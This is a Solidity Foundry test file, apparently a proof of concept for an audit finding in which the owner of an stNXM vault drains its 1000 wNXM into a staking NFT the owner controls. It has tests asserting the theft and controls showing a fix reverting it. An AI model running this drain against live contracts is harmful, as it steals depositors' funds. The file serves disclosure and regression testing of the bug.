// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {
    Exploit,
    StNXM,
    StNXMFixed,
    NxmToken,
    WNxm,
    NxmMaster,
    TokenController,
    StakingNFT,
    StakingPool,
    IWNXM,
    IERC20,
    INxmMaster,
    IStakingNFT
} from "./64080-h-2-the-vault-can-be-drained-sherlock-steth-by-easedefi-git.sol";

contract StNxmVaultDrainTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant ATTACKER_TOKEN_ID = 105;
    uint256 internal constant TRANCHE = 8;
    uint256 internal constant AMOUNT = 1000 ether;

    // ── Vulnerable path: the owner drains the vault via _stakeNxm ────────────
    function test_exploit_ownerDrainsVaultIntoOwnedStakingNFT() public {
        Exploit e = new Exploit();
        e.run();

        NxmToken nxm = NxmToken(e.nxmAddr());
        WNxm wNxm = WNxm(e.wNxmAddr());

        // Vault started with 1000 wNXM and ends fully drained (no wNXM, no NXM).
        assertEq(e.vaultWNxmBefore(), AMOUNT, "vault funded with 1000 wNXM");
        assertEq(wNxm.balanceOf(e.vaultAddr()), 0, "vault wNXM drained to zero");
        assertEq(e.vaultNxmAfter(), 0, "vault holds no NXM after");

        // The attacker EOA (the staking-NFT owner == the admin) received the
        // full 1000 NXM that was funded entirely by vault assets.
        assertEq(e.attackerNxmBefore(), 0, "attacker started with 0 NXM");
        assertEq(e.stolen(), AMOUNT, "attacker gained the drained amount");
        assertEq(nxm.balanceOf(ATTACKER), AMOUNT, "1000 STOLEN-NXM at attacker EOA");
    }

    // ── Negative control: the beea701 fix reverts the same attack ────────────
    function test_control_fixedVaultRevertsDrain() public {
        // Rebuild the identical Nexus scaffolding.
        NxmToken nxm = new NxmToken();
        TokenController tc = new TokenController(IERC20(address(nxm)));
        WNxm wNxm = new WNxm(IERC20(address(nxm)));
        NxmMaster master = new NxmMaster(payable(address(tc)));
        StakingNFT nft = new StakingNFT();
        StakingPool pool = new StakingPool(IERC20(address(nxm)), tc, nft);

        // This test contract is the owner of the FIXED vault.
        StNXMFixed vault = new StNXMFixed(
            IWNXM(address(wNxm)),
            IERC20(address(nxm)),
            INxmMaster(address(master)),
            IStakingNFT(address(nft)),
            ATTACKER_TOKEN_ID,
            address(pool)
        );

        // Attacker keeps the NFT and approves the vault (same setup).
        nft.mintTo(ATTACKER, ATTACKER_TOKEN_ID);
        nft.approveFrom(ATTACKER, address(vault), ATTACKER_TOKEN_ID);
        wNxm.mintTo(address(vault), AMOUNT);

        // The added ownerOf-check makes the exact same call revert.
        vm.expectRevert(bytes("Token is not owned by stNXM vault."));
        vault.stakeNxm(AMOUNT, TRANCHE, ATTACKER_TOKEN_ID);

        // And with the fix, nothing was drained: vault keeps its wNXM.
        assertEq(wNxm.balanceOf(address(vault)), AMOUNT, "fixed vault retains all wNXM");
        assertEq(nxm.balanceOf(ATTACKER), 0, "fixed vault: attacker gets nothing");
    }

    // ── Sanity control: a legitimate stake into a vault-owned token is fine ──
    function test_control_fixedVaultAllowsVaultOwnedToken() public {
        NxmToken nxm = new NxmToken();
        TokenController tc = new TokenController(IERC20(address(nxm)));
        WNxm wNxm = new WNxm(IERC20(address(nxm)));
        NxmMaster master = new NxmMaster(payable(address(tc)));
        StakingNFT nft = new StakingNFT();
        StakingPool pool = new StakingPool(IERC20(address(nxm)), tc, nft);

        uint256 vaultToken = 200;
        StNXMFixed vault = new StNXMFixed(
            IWNXM(address(wNxm)),
            IERC20(address(nxm)),
            INxmMaster(address(master)),
            IStakingNFT(address(nft)),
            vaultToken,
            address(pool)
        );

        // The vault itself owns the staking NFT -> the fix's check passes.
        nft.mintTo(address(vault), vaultToken);
        wNxm.mintTo(address(vault), AMOUNT);

        vault.stakeNxm(AMOUNT, TRANCHE, vaultToken); // must NOT revert
        assertEq(pool.stakeOf(vaultToken), AMOUNT, "vault-owned stake recorded");
    }
}
